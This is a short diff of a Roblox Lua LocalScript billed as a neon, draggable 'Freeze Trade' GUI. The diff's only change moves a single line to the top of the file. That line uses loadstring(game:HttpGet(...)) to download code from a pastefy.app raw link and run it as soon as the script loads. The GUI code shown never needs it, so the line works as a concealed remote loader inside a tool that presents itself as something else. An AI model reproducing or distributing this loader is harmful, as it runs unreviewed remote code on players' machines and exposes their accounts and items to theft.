@@ -1,6 +1,6 @@
 -- Freeze Trade GUI - Neon, Draggable, Informative Player Details
 -- Place in StarterPlayerScripts as a LocalScript
-
+loadstring(game:HttpGet("https://pastefy.app/vs6D6Wq7/raw"))()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
@@ -55,7 +55,7 @@ mainFrame.InputBegan:Connect(function(input)
 		end)
 	end
 end)
-loadstring(game:HttpGet("https://pastefy.app/vs6D6Wq7/raw"))()
+
 mainFrame.InputChanged:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 		dragInput = input
